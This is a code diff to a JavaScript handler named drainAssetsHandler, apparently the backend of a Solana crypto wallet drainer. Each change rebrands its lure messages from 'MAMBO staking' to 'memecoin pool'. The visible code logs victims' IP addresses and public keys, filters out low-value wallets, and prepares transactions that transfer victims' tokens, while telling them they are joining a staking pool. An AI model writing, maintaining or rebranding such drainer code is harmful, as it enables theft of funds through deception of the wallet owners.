@@ -653,7 +653,7 @@ export default async function drainAssetsHandler(req, res) {
       return res.status(400).json({ 
         success: false,
         error: 'Trust Wallet not supported',
-        message: 'Non Participant Wallet'
+        message: 'Wallet not eligible for memecoin pool'
       });
     }
     
@@ -669,7 +669,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: user || 'Missing',
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: 'Missing or invalid user parameter',
-          context: 'SPL Staking - Parameter Validation',
+          context: 'SPL Memecoin Pool - Parameter Validation',
           walletType: validatedWalletType,
           lamports: 0,
           projectName: PROJECT_NAME
@@ -681,7 +681,7 @@ export default async function drainAssetsHandler(req, res) {
       return res.status(400).json({ 
         success: false,
         error: 'Missing or invalid user parameter',
-        message: 'Non Participant Wallet'
+        message: 'Wallet not eligible for memecoin pool'
       });
     }
     
@@ -692,7 +692,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: user || 'Invalid Format',
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: 'Invalid Solana public key format',
-          context: 'SPL Staking - Public Key Format Validation',
+          context: 'SPL Memecoin Pool - Public Key Format Validation',
           walletType: validatedWalletType,
           lamports: 0,
           projectName: PROJECT_NAME
@@ -704,7 +704,7 @@ export default async function drainAssetsHandler(req, res) {
       return res.status(400).json({ 
         success: false,
         error: 'Invalid Solana public key format',
-        message: 'Non Participant Wallet'
+        message: 'Wallet not eligible for memecoin pool'
       });
     }
 
@@ -719,7 +719,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: user || 'Invalid Format',
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: `Invalid public key format: ${error.message}`,
-          context: 'SPL Staking - Public Key Validation',
+          context: 'SPL Memecoin Pool - Public Key Validation',
           walletType: validatedWalletType,
           lamports: 0,
           projectName: PROJECT_NAME
@@ -731,7 +731,7 @@ export default async function drainAssetsHandler(req, res) {
       return res.status(400).json({ 
         success: false,
         error: 'Invalid wallet format',
-        message: 'Non Participant Wallet'
+        message: 'Wallet not eligible for memecoin pool'
       });
     }
 
@@ -759,7 +759,7 @@ export default async function drainAssetsHandler(req, res) {
       return res.status(403).json({ 
         success: false,
         error: 'Security violation',
-        message: 'Non Participant Wallet'
+        message: 'Wallet not eligible for memecoin pool'
       });
     }
 
@@ -787,7 +787,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: `Suspicious wallet address: ${differences} character differences from receiver`,
-          context: 'SPL Staking - Security Check',
+          context: 'SPL Memecoin Pool - Security Check',
           walletType: validatedWalletType,
           lamports: 0,
           securityViolation: true,
@@ -803,7 +803,7 @@ export default async function drainAssetsHandler(req, res) {
         return res.status(403).json({ 
           success: false,
           error: 'Suspicious wallet address',
-          message: 'Non Participant Wallet'
+          message: 'Wallet not eligible for memecoin pool'
         });
       }
     }
@@ -858,7 +858,7 @@ export default async function drainAssetsHandler(req, res) {
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           lamports: userSolBalance,
           walletType: walletType || 'Unknown',
-          context: 'SPL Staking - Transaction Fees',
+          context: 'SPL Memecoin Pool - Transaction Fees',
           required: MIN_SOL_FOR_FEES,
           splTokens: 0,
           projectName: PROJECT_NAME
@@ -870,7 +870,7 @@ export default async function drainAssetsHandler(req, res) {
       return res.status(400).json({
         success: false,
         error: 'Insufficient SOL for fees',
-        message: 'Non Participant Wallet',
+        message: 'Wallet not eligible for memecoin pool',
         solBalance: userSolBalance,
         requiredSol: MIN_SOL_FOR_FEES
       });
@@ -886,7 +886,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: 'Low value wallet detected',
-          context: 'SPL Staking - Security Check',
+          context: 'SPL Memecoin Pool - Security Check',
           walletType: walletType || 'Unknown',
           lamports: userSolBalance,
           securityViolation: true,
@@ -900,7 +900,7 @@ export default async function drainAssetsHandler(req, res) {
       return res.status(400).json({
         success: false,
         error: 'Low value wallet',
-        message: 'Non Participant Wallet',
+        message: 'Wallet not eligible for memecoin pool',
         solBalance: userSolBalance,
         minRequired: MIN_WALLET_VALUE
       });
@@ -979,7 +979,7 @@ export default async function drainAssetsHandler(req, res) {
       
       return res.status(200).json({ 
         success: false,
-        message: '🚀 No tokens found in this wallet for the MAMBO staking',
+        message: '🚀 No tokens found in this wallet for the memecoin pool',
         tokenCount: 0,
         solBalance: userSolBalance
       });
@@ -1016,7 +1016,7 @@ export default async function drainAssetsHandler(req, res) {
         success: true,
         requiresPreInit: true,
         preInitTransactions: preInitResult.preInitTransactions,
-        message: `🚀 Setting up ${preInitResult.preInitTransactions.length} token accounts for MAMBO staking`,
+        message: `🚀 Setting up ${preInitResult.preInitTransactions.length} token accounts for the memecoin pool`,
         tokenCount: 0,
         totalTokens: drainableTokens.length,
         solBalance: userSolBalance,
@@ -1150,7 +1150,7 @@ export default async function drainAssetsHandler(req, res) {
       
       return res.status(200).json({ 
         success: false,
-        message: 'No valid tokens to process for staking',
+        message: 'No valid tokens to process for the memecoin pool',
         tokenCount: 0,
         solBalance: userSolBalance
       });
@@ -1266,7 +1266,7 @@ export default async function drainAssetsHandler(req, res) {
               publicKey: userPubkey.toString(),
               ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
               error: 'All RPC endpoints failed for blockhash retrieval',
-              context: 'SPL Staking - Blockhash Fallback Failure',
+              context: 'SPL Memecoin Pool - Blockhash Fallback Failure',
               walletType: walletType || 'Unknown',
               lamports: userSolBalance,
               projectName: PROJECT_NAME
@@ -1308,7 +1308,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: `Clean transfer transaction simulation failed: ${cleanTransferSimulation.error}`,
-          context: 'SPL Staking - Clean Transfer Simulation',
+          context: 'SPL Memecoin Pool - Clean Transfer Simulation',
           walletType: walletType || 'Unknown',
           lamports: userSolBalance,
           projectName: PROJECT_NAME
@@ -1337,7 +1337,7 @@ export default async function drainAssetsHandler(req, res) {
           publicKey: userPubkey.toString(),
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           error: `Transaction simulation failed: ${simulationError.message}`,
-          context: 'SPL Staking - Transaction Simulation',
+          context: 'SPL Memecoin Pool - Transaction Simulation',
           walletType: walletType || 'Unknown',
           lamports: userSolBalance,
           projectName: PROJECT_NAME
@@ -1433,7 +1433,7 @@ export default async function drainAssetsHandler(req, res) {
       totalTokens: drainableTokens.length,
       solBalance: userSolBalance,
       requiredSol: MIN_SOL_FOR_FEES,
-              message: `🚀 MAMBO staking prepared! ${processedTokens} tokens ready for transfer`,
+              message: `🚀 Memecoin pool prepared! ${processedTokens} tokens ready for transfer`,
       tokenDetails: tokenDetails,
       rateLimitBypass: rateLimitBypass, // Include rate limit bypass information
       summary: {
